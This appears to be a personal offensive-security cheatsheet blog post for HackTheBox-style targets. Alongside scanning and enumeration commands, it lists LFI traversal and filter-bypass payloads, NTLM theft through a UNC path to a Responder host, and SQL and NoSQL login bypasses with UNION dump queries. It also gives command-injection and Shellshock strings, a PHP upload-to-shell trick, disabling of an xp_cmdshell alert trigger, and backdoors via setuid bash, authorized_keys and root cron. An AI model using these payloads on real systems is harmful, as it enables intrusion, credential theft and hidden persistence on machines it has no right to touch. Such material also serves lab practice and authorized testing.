---
title: maki cheatsheet 
categories: [cheatsheet, linux]
tags: [nmap, lfi, sqli]
pin: true
---

## SCANNING

### nmap 

**REMEMBER TO SEAERCH VERSION ON INTERNET TO CHECK IF VULNERABLE! or scan for eternablue with --script vuln**

**script directory: /usr/share/nmap/scripts**

**check filtered ports maybe we can access them later with SSRF**

**scan with xmas, null or other scans to bypass FIREWALL if needed**

**TRANSFER STATICALLY LINKED NMAP TO MACHINE! SO YOU CAN SCAN WITHOUT PIVOTING! https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap**



scan ipv4 normal

`nmap $IP`

scan ipv4 all ports 

`nmap $IP -p-`

scan ipv4 enum version

`nmap -sV $IP`

scan ipv4 default scripts

`nmap -sC $IP`

scan SYN stealth 

`nmap -sS $IP`

scan output to file

`nmap -oN out.txt $IP`

scan i often do ports are often discovered with nmap:

`nmap -sVCS -oN nmap/initial $IP -p $PORTS`

scan UDP 

`nmap -sU $IP`

scan UDP top ports

`nmap -sU $IP --top-ports=50`

scan with VULN script

`nmap --script vuln $IP`

scan with some scripts

`nmap --script ftp* $IP`

scan IPV6 

`nmap -6 dead:babe::1001`

scan IPV6 all ports

`nmap -6 dead:babe::1001 -p-`

scan min-rate

`nmap --min-rate 100000 $IP`

scan no ping (bypass FIREWALL)

`nmap -Pn $IP`

scan fast or stealthier (-T1 stealth -T5 aggressive)

`nmap -T5 $IP`

scan verbose

`nmap -vvv $IP`

scan network with nmap

`nmap -sP 192.168.0.0/24`

### rustscan 

scan ip all ports

`rustscan -a $IP`

scan ip ip range

`rustscan -a $IP/24`

scan ip greppable

`rustscan -a $IP -g`

### fping

ping sweep net

`fping 192.168.0.0/24 2>/dev/null`

### arp-scan 

arp scan local net

`arp-scan -l`

arp scan network

`arp-scan 192.168.0.0/24`

# WEB EXPLOITATION

## DIRECTORY BRUTEFORCING

find .git directory, backup file, directory listing and other intresting files!

if i can't access a file with a GET request we can try to do a POST request!!

### gobuster 

**USEFUL WORDLISTS:**
```
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
```

gobuster dir brute

`gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

gobuster vhost enumeration

`gobuster vhost -u http://domain.name/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`


### feroxbuster

feroxbuster DIR BRUTE RECURSIVE

`feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

feroxbuster DIR BRUTE NO RECURSE

`feroxbuster -n -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

feroxbuster status codes

`feroxbuster -n -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --status-codes 404`

## FUZZING


use wordlists in /usr/share/seclists/Fuzzing/

FUZZ KEYWORD IS THE PLACEHOLDER FOR THE WORDLIST!

you can even fuzz in post requests

fuzz cgi-bin for shellshock or for other scripts

FUZZ php values like test.php?path=FUZZ

FUZZ PROCESS ID NUMBER

FUZZ FOR COMMON WEB EXTENSION!

FUZZ php parameters /opt/seclists/discovery/web-content/burp-parameters.txt!

you can even fuzz cookies

-H to add a


### wfuzz

wfuzz fuzz example


`wfuzz -u http://$IP/include.php?path=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`

wfuzz hide words

`wfuzz -u http://$IP/include.php?path=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 100`

wfuzz hide codes

`wfuzz -u http://$IP/include.php?path=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 402`

wfuzz hide chars

`wfuzz -u http://$IP/include.php?path=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 1337`

wfuzz regex

`wfuzz -H "User-Agent: () { :;}; echo; echo vulnerable" --ss vulnerable -w cgis.txt http://localhost:8000/cgi-bin/FUZZ`

wfuzz proc id number

`wfuzz -u http://10.10.11.154/index.php?page=../../../../../../proc/FUZZ/status -w /home/makider/Desktop/fuzzpid.txt --hw 0 -c -f htb/retired/pids.txt`


wfuzz php parameters

`wfuzz -c --hh 0 -w /opt/seclists/discovery/web-content/burp-parameters.txt http://10.10.10.10/image.php?FUZZ=/etc/passwd`

wfuzz subdomains

`wfuzz -c --hc 404,302 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.timing.htb' http://timing.htb/`


### ffuf

i don't use it much but

`ffuf -u http://$IP/include.php?path=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`

should work pretty much the same

## FIND EXPLOIT OR FUZZ WEBAPP

wpscan to scan wordpress websites!

CHECK WORDPRESS PLUGINS BY CHECKING WEBPAGE HTML SOURCE CODE!

**get /var/www/wordpress/wp-config.php file to get credentials and other**

get wordpress database to then crack hashes

check wordpress version online for exploit

we can use whatweb to check what CMS the site is using

wpscan bruteforce passwords of found users (at least for 5 minutes on hackthebox)

xmlrpc.php or wp-login.php web bruteforce

if old wordpress version we can go to plugins directory and get a revshell

if old wordpress version we can modify 404.php or any php file to get revshell (use php pentestmonkey or typical netcat mkfifo)





### nikto

`nikto -h $IP`

### wpscan

wpscan 

`wpscan --url http://wordpress.site/`

wpscan enumerate plugins

`wpscan --url http://wordpress.site/ --enumerate p`

wpscan enumerate usernames

`wpscan --url http://wordpress.site/ --enumerate u`

wpscan stealth

`wpscan --stealthy --url http://wordpress.site/`

wpscan with api token to check vulns 

`wpscan --url http://wordpress.site/ --api-token (api token here)`

wpscan plugin detection aggressive 

`wpscan --url http://wordpress.site/ --enumerate p --plugin-detection aggressive`


wordpress password spray

`wpscan --url http://wordpress.site/ --passwords passwords.txt`

wordpress brute force 

`wpscan –url http://example.com –passwords rockyou.txt –usernames andy`

## LFI 

lfi in post requests can exist

always use burp to check for lfi

IFRAME PDF EMBED FILES `<iframe src=file:///etc/passwd width=100%></iframe>`

https://book.hacktricks.xyz/pentesting-web/file-inclusion

**NTLM STEAL WITH LFI** test.php?include=\\$RESPONDER_IP\ (it should work even with "/" to bypass some waf)

get /etc/passwd

check for LOG POISONING

check for /proc/self/environ injection

check /etc/hosts

check home directory of user (.bashrc)

check .git directories config file

**check if ID_RSA exists in user home directory**

**ALWAYS check if there is a file called db_conn.php, config.php or something like that because there can be hardcoded creds**

to check OPEN PORTS with LFI we can check /proc/net/tcp (decimal encoded)

to check how was a program started we can get /proc/self/cmdline or /proc/(PID)/cmdline

to get the file we can get /proc/self/cmd 

to check if in a container use /proc/self/cgroup and look for docker, or simply go to / and get .dockerenv

we can modify source code of a page if there is a php post parameter that is vulnerable to path trasversal (so we can overwrite maybe index.php and get a shell)

a username can be taken from /etc/passwd and reused for login page

**if we have INCLUDE LFI in a page and we can at the same time upload a file to the server, it's simple because we can inject php code like <?php system("id")?> to the image and then include it with the lfi to load it and get the shell**

we can try to get capabilities of process by getting /proc/PID/stat or /proc/self/stat and then decoding capabilities with `capsh --decode='(string)'`

get to check for other subdomains `/etc/apache2/sites-available/000-default.conf` OR `/etc/nginx/sites-enabled/default`

/etc/motd

we can forcefully browse the file if the lfi does not work to load it

**PATH TRAVERSAL ON SUDO -L 
(ALL) /usr/bin/node /usr/local/scripts/*.js 
this is vulnerable for example**

**!!TRY RFI!!** smb:///

### bypassing LFI filters

`../`

`....//`


(double url encoded ../)
`%252E%252E%252F`

`%00../`

`/etc/passwd`

`..2f..2f..2fetc2fpasswd`

use /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt if nothing works

### LFI TO RCE
https://book.hacktricks.xyz/pentesting-web/file-inclusion 

### PHP wrappers

`php://filter/convert.base64-encode/resource=index.php`

some php wrappers can lead to code execution check here

https://book.hacktricks.xyz/pentesting-web/file-inclusion


## COMMAND INJECTION

we can try to inject commands if the unfiltered input is then passed to a system command.

usually these are the chars that you can use to inject commands

```
;
|
$()
``
\n
```

but we can even use a list called special chars.txt with wfuzz `/usr/share/seclists/Fuzzing/special-chars.txt`
```
Curling braces error = BIG INDICATOR SSTI

quote == LIKELY SQL INJECTION

Pipe, &&, ; == LIKELY COMMAND INJECTION
```
**remember that we can bypass SPACE FILTERING by replacing a space with ${IFS}**

**remember that it's better to use "bash -c"**

we can try to double ; to get command injection 

`chmod +s /bin/bash` to set bash as suid and get root with `bash -p`

another method for command injection:

```js
{"target":"\"; ping 10.9.1.194; echo \""}
```

## SQL INJECTION


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

comment for sqli:

`-- ` (note the space! we can use a `-- -` to be sure)

enable xp_cmdshell for mssql to execute commands


SQL INJECTION IN UPDATE STATEMENT EXISTS AND WE CAN TRY TO INJECT NEW ADMIN HASHED PASSWORDS

SEARCH ON INTERNET FOR CMS EXPLOITS OR SQLI

delete policy that doesn't allow you to execute xp_cmdshell

`disable trigger ALERT_xp_cmdshell on all server`

we can use impacket-mssqlclient to connect to mssql

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

### sqlmap 

capture request with burpsuite then copy it and save to a file

then,

`sqlmap -r req.txt`


enumerate databases

`sqlmap -r req.txt --dbs`

set database type:

`sqlmap -r req.txt --dbms=mysql`

get database tables:

`sqlmap -r req.txt -D webapp --tables`

dump database

`sqlmap -r req.txt -D webapp -T users --dump`

does not always work

`sqlmap -r req.txt --os-shell`

### UNION BASED SQLI
https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635

get column number

`'UNION SLECT 1,2,3.. -- -` until it does not error out

enumerate data types

`'UNION SELECT 1,"a",3 -- -`

then in that column we can inject statements

get tables

`'UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'-- -`

example of table dump
`UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users-- -`

enumerate db names

`UNION SELECT 1,2,db_name() FROM staff_users-- -`
`UNION SELECT 1,2,db_name(1) FROM staff_users-- -`
`UNION SELECT 1,2,db_name(2) FROM staff_users-- -`
...

list databases from information_schema

`' AND 1=2 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA-- -`

get number of columns

`ORDER BY 1-- -`
`ORDER BY 2-- -`
...

bypass login

`' OR 1=1-- -` 

load file

`LOAD_FILE("/etc/passwd")`

**BYPASS SPACE FILTERING**

`'/**/union/**/select/**1,2--/**/-`

for blind and boolean sql injection try to use sqlmap or write a custom script


## SSRF 

check filtered ports maybe we can access them with a found ssrf

SSRF REDIRECT

```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', "http://127.0.0.1:3000/")
      self.end_headers()


HTTPServer(("0.0.0.0", 8081), Redirect).serve_forever()
```

ipv6 url might bypass url block

hex encoded IP ADDRESS might do too


## nosql injection

**source**:
https://book.hacktricks.xyz/pentesting-web/nosql-injection

to bypass login we can check for a nosql injection here is how:


`username[$ne]=toto&password[$ne]=toto`

or, more efficiently, we can try by **changing the request type to application/json** to **then** insert this payload

`{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }`

```json
{
   "username":{
      "$ne":"foo"
   },
   "password":{
      "$ne":"bar"
   }
}
```

to extract lenght info:

`username[$ne]=toto&password[$regex]=.{1}`

we can even dump database with the help of some scripts online!


## type confusion/type juggling

this is a php magic trick that some times works! (try it on bug bounty too if you want)

```json
{
  "type": true
}
```

`username[]=foo&password[]=bar`

# privesc

https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist

## useful commands

## get environment variables

`env`

## get allowed sudo commands and environment variables

When conducting a security assessment, it's important to pay close attention to any interesting entries that may appear in the output of the sudo -l command. These entries may indicate the presence of a privileged binary that can be used to elevate one's access level. To determine if a binary can be used for privilege escalation, it's recommended to check the GTFObins website (https://gtfobins.github.io/). This website contains a wealth of information on various Linux binaries and their potential for privilege escalation. Additionally, it's also a good practice to check for SUID (Set User ID) binaries on the system, as these may also be used for privilege escalation. Remember that privilege escalation is one of the key steps in the penetration testing process and must be thoroughly investigated.

`sudo -l`

## list all files

`ls -la`

## get id

`id`

## get groups

`groups`

## get a list of all users and possibly services

`cat /etc/passwd`

(cut for bruteforce)

`cat /etc/passwd | cut -d ":" -f 1`

## get linux version and architecture

`cat /proc/version`

`uname -a`

`cat /etc/issue`

## get list of running processes by everyone

`ps eaf`

`ps eaf --forest`

`ps aux`

## get interfaces 

(look for interfaces to pivot)

`ip a`

`ifconfig`

## get open ports

netstat -a: shows all listening ports and established connections.

netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.

netstat -l: list ports in “listening” mode. 

 This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

netstat -s: list network usage statistics by protocol

**these commands will mostly get all the info you need**

`netstat -alnp`

`ss -tulnp`

## find

2>/dev/null is needed to redirect errors to null so they don't spam your shell 

```bash
find . -name flag1.txt 2>/dev/null (find file)
find / -type d -name config 2>/dev/null (type directory)
find / -type f -perm 0777 2>/dev/null (read, write, & execute for owner, group and others)
find / -perm a=x 2>/dev/null (executable files)
find / -mtime 10 2>/dev/null (modified 10 days)
find / -size 50M 2>/dev/null (50 megabyte size)
find / -name perl* 2>/dev/null (find files that begin with perl)
find / -name python* 2>/dev/null (find files that begin with python)
find / -name gcc* 2>/dev/null (find files that begin with gcc)
find / -writable 2>/dev/null (find files that are writable by you)
find / -readable 2>/dev/null (find files that are readable by you)

SUID:

find / -perm -u=s -type f 2>/dev/null

FLAG

find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
find / -type f -name "*flag*" -ls 2>/dev/null

CHECK FILES OWNED BY USER:
find / -type f -user server-management -exec ls -l {} + 2>/dev/null

```

## useful enumeration scripts

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS (all in one privesc tool)

https://github.com/DominicBreuker/pspy (find cronjobs and spy for commands ran by other users)

## useful binaries

nc (we can also upload old version with the execute command to get revshells)

## other tips

when you find a password always use them for lateral movement `su` command, databases...

identify kernel version and check for kernel exploits

**check soruce code of applications, they may contain credentials or other juicy things!**

keep in mind that if you have root read access we can get /etc/shadow and crack the hashes

if all environment variables are allowed before a specific command found in `sudo -l` we could use **LD_PRELOAD** to privesc

**CAPABILITIES** `capsh -r / 2>/dev/nul`

***CRON JOBS** (use pspy or cat /etc/crontab)

if some wordpress website is running we can get /var/www/wordpress/wp-config.php to extract intresting info

remember to check config files

**if i can't access from the external maybe i can from internal (ssh tunnel or chisel forwarding)**

bash -c "(command)" sometimes solves all the problems!

in the /opt directory we can find intresting optional files

we can fuzz for txt files?

**symlink privesc**

bruteforce?

**port forwarding / pivoting**

check if sudo is using the secure path environment variable

enumerate groups

**exiftool** to get exif data from pdf,images etc (maybe get comments or author)

check for .bak files

we can transfer docker binary if there isn't one

**transfer STATICALLY linked binaries**

if we find a command injections or similar we can suid /bin/bash to privescalate (and we can insert a cronjob to backdoor root)

**when you have the occasion always use ssh for a stable shell (also Check id_rsa)**

we can echo our public key to the user's authorized_keys files in /home/user/.ssh/authorized_keys or /root/.ssh/authorized_keys

**check pspy64!**

`cat /proc/net/arp` to check the arp cache for ips

best ways to find strings on a elf file?:
`cat` it or use `strings` command

check **/var/www/html**

**`watch -x ls -la`** to continuously execute a command (in this case `ls -la`)

we can intercept auth if a program tries to do it (tcpdump/wireshark) or open listener on port

**check for reflections between docker container and host machine, this could be used for breakout**

`lsattr` to get attributes of a file

**look for doas program** and for /usr/local/etc/doas.conf (basically a `sudo -l`)

backup files in unix have a .bak extension or a tilde(~) at the end of the file 